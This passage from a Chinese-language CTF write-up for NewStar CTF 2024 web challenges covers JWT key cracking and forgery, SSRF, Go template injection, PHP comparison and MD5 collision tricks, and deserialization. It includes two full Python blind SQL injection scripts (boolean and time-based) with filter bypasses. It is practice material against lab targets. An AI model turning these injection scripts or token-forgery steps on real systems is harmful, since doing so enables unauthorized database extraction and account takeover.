__name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>分析源代码发现这里用了JWT令牌进行身份验证，而且密钥只有六位数字！！完全可以爆破。</p><p>这里还给了一个用户名和密码，直接用提供的用户账号登进去，获取一个token样例</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph6.png" class=""><p>用JWTcrack破解密钥</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph8.png" class=""><p>用在线JWT生成来伪造令牌，<em>注意这里的exp里包含了令牌的有效时间，可以通过把数字加大来延长有效时间</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph10.png" class=""><p>成功伪造admin身份</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph11.png" class=""><p>管理员面板给了一个api，可以访问本地链接，那么应该有一个SSRF漏洞在这里，但是在哪呢？</p><p>继续分析源代码，发现一个奇怪的地方</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph12.png" class=""><p>可见这里导入了一个自定义库，那应该就是在与app.py的同目录下有一个flag.py</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph14.png" class=""><p>得到内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_number_string</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"></span><br><span class="line">get_flag = Flask(<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.pop(<span class="string">&quot;ICQ_FLAG&quot;</span>, <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@get_flag.route(<span class="params"><span class="string">&quot;/fl4g&quot;</span></span>)</span></span><br><span class="line"><span class="comment">#如何触发它呢?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><p>直接用管理员面板访问5001端口的&#x2F;fl4g即可</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph15.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph16.png" class=""><h2 id="臭屁踩踩背"><a href="#臭屁踩踩背" class="headerlink" title="臭屁踩踩背"></a>臭屁踩踩背</h2><p>西电终端的环境坏了，写不了，这里放一下官方题解的链接【讲的很好，强推！！！】</p><p><a href="https://ctf.xidian.edu.cn/training/14?challenge=620&tab=answer">NewStar CTF 2024 - 西电 CTF 终端</a></p><h2 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h2><p>sqlmap不会用，以前从来没有手敲过盲注脚本，这里就简单记一下题解的脚本，以后当模板用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&#x27;_-&#123;&#125;&#x27;</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment"># 限制速率，防止请求过快</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这条语句能查询到当前数据库所有的表名</span></span><br><span class="line">        tables = <span class="string">f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取所有表名的第 i 个字符，并计算 ascii 值</span></span><br><span class="line">        char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;i&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破该 ascii 值</span></span><br><span class="line">        b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span></span><br><span class="line">        p = <span class="string">f&#x27;Alice\&#x27;and(<span class="subst">&#123;b&#125;</span>)#&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>union</code> 被禁用，说明此时该使用盲注，我们能够通过插入 <code>and 1</code> 或者 <code>and 0</code> 来控制是否返回数据，由此可以使用布尔盲注</p><p><code>=</code> 的绕过可以使用 <code>like</code> 或者 <code>in</code> 代替</p><p>空格和斜杠 <code>/</code> 被禁用，可以使用括号代替</p><h1 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h1><h2 id="Pangbai过家家（4）"><a href="#Pangbai过家家（4）" class="headerlink" title="Pangbai过家家（4）"></a>Pangbai过家家（4）</h2><p>打开发现这么一个东西，问了问AI，是Go语言的SSTI，于是赶紧去学了一下Go语言SSTI相关的东西</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_0.png" class=""><p>相关文章：<a href="https://blog.csdn.net/Elite__zhb/article/details/134352384">[Go语言]SSTI从0到1_go ssti-CSDN博客</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4.png" class=""><p>分析给我们的源代码，可知当前对象是helper，有两个成员结构体，我们要看的Config，因为Config给了我JWT的key，不用往下翻就知道待会儿设计cookie伪造。</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_2.png" class=""><p>拿到密钥，直接丢到在线平台伪造。（<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>，这个好使）</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_4.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_3.png" class=""><p>继续往下看可以看到一个文件读取函数，应该是任意文件读取漏洞，读的是config.SignaturePath的内容，要想办法对内容进行篡改。</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_8.png" class=""><p>相关代码在这里，可见要用PUT方法，而且要求IP为本机。把要修改的路径放在包的主体即可。</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_6.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_7.png" class=""><p>这里我们直接改包，然后加一个报头Host，设置为本机。读取环境变量文件。</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_9.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_10.png" class=""><h2 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h2><p>首先进行目录扫描，扫出一个文件</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho1.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho2.png" class=""><p>根据文件内容转到相应页面</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho3.png" class=""><p>这里要求传入一个字符串，其中包含字符0，不含字母，且要求整数化等于1337。一开始的思路是直接传入八进制的0</p><p>2471，这样intval函数会将其识别为八进制并自动转化为十进制整数1337，</p><p>但是由于这里0在第一位，对应索引号为0，strops返回0，则！strpos的判断结果为真，导致die掉</p><p>所以这里还需要在02471前加一个空格，（%20是空格的url编码）</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho4.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho5.png" class=""><p>成功拿到信息，除了给出一个成分之外，还给了一串字符，让我们对其解密</p><p>询问deepseek发现是ROT13加密，对其进行解密</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho6.png" class=""><p>得到下一个路径</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho7.png" class=""><p>首先，get传入两个参数，要求其md5相同</p><p>由于是强比较，而且过滤了数组，所以只能上网去找强碰撞的字符</p><p><a href="https://blog.csdn.net/m0_73818134/article/details/131793815">md5强比较的几种绕过，强碰撞，shal强比较的几种绕过，强碰撞_md5强比较绕过-CSDN博客</a></p><p>在这里找到一组满足条件的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;dog=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p>下一步是post传入一个参数，要求其自身与自身的md5弱相等</p><p>这不是传统的弱相等，传统的题只需要找一个开头为字母且md5为0e开头的字符串即可</p><p>但这方法在本题行不通，因为这题的php版本是8</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho8.png" class=""><p><a href="https://blog.csdn.net/qq_44879989/article/details/133230251">PHP 变动：PHP 8 版本下字符串与数值的弱比较_php 隐式转换比较-CSDN博客</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho10.png" class=""><p>所以只能找数值字符串，也就是本身是0e开头，md5后仍是0e开头</p><p>这样的字符串也不少，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><p>最后一步，传入一个字符串，其md5以8031b开头</p><p>这也是一个强比较，没有办法，只能写脚本尝试碰撞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>))  <span class="comment">#其实相比随机数，用for in range穷尽会更好，因为可以指导判断是否能在这个范围找到</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>) :</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tar=<span class="string">&quot;8031b&quot;</span>   <span class="comment">#寻找以8031b为开头的md5的字符串</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs=generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] testing on <span class="subst">&#123;strs&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> encode(strs.encode()).startswith(tar) :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found!&quot;</span>,strs)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho12.png" class=""><p>传入参数获取信息</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho11.png" class=""><p>接下来进入最后的挑战（烦死这个套娃了）</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho13.png" class=""><p>参数的传入是通过input伪协议，只要把要传入的内容直接写在post主体就好了</p><p>这里需要传入一个序列化之后的chocolate对象，虽然加了一个正则检测，但是其实好像没有什么用</p><p>就算触发错误，析构函数仍然会执行，我们仍然可以得到想要的信息</p><p>而且绕过也很简单，大小写绕过就好</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho15.png" class=""><p>传入即可得到最后的信息</p><p>但是我找了半天，也找不到糖在哪，看了提示之后才知道这个要自己试</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho16.png" class=""><p>随便填一个糖分</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho17.png" class=""><p>从这里可以看到填的数字低了，如果填的数字太大，会显示太甜了</p><p>那就好办了，直接二分法把正确的糖分试出来，最后发现是2042</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho18.png" class=""><h2 id="blindsql2"><a href="#blindsql2" class="headerlink" title="blindsql2"></a>blindsql2</h2><p>这里直接给出脚本了，与前面的blindsql1的过滤情况是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#盲注脚本模板，可用于布尔盲注和时间盲注</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"><span class="keyword">from</span> retry <span class="keyword">import</span> retry</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.43.76:1405/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#有时候会发生连接错误，需要重试</span></span><br><span class="line"><span class="meta">@retry(<span class="params">tries=<span class="number">3</span>,delay=<span class="number">1</span></span>)   </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">injection</span>(<span class="params">url,params</span>):</span><br><span class="line">    res = requests.get(url, params)</span><br><span class="line">    <span class="keyword">return</span> res.elapsed.total_seconds()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_param</span>(<span class="params">position,char_to_be_tried</span>):</span><br><span class="line"> <span class="comment"># 模板语句，采用括号绕过</span></span><br><span class="line">    tables = <span class="string">f&#x27;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\&#x27;flag%\&#x27;)))&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取所有表名的第position个字符，并计算 ascii 值</span></span><br><span class="line">    char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;position&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 爆破该 ascii 值</span></span><br><span class="line">    b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(char_to_be_tried)&#125;</span>))&#x27;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 若 ascii 猜对了，则 and 后面的结果(即b的值)是 true</span></span><br><span class="line">    p = <span class="string">f&#x27;Alice\&#x27;and(if(<span class="subst">&#123;b&#125;</span>,sleep(1.5),0))#&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + <span class="string">&#x27;,_-&#123;&#125;@&#x27;</span> + string.digits :</span><br><span class="line">        time.sleep(<span class="number">0.01</span>) <span class="comment"># 限制速率，防止请求过快</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        p=get_param(i,c)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;</span><br><span class="line"></span><br><span class="line">        respond_time = injection(url,params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> respond_time &gt; <span class="number">1.5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(respond_time)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#当前位置缺失，可能是字符集不完整</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Lack&#x27;</span>)</span><br><span class="line">        result += <span class="string">f&#x27;&lt;<span class="subst">&#123;i&#125;</span>&gt;&#x27;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
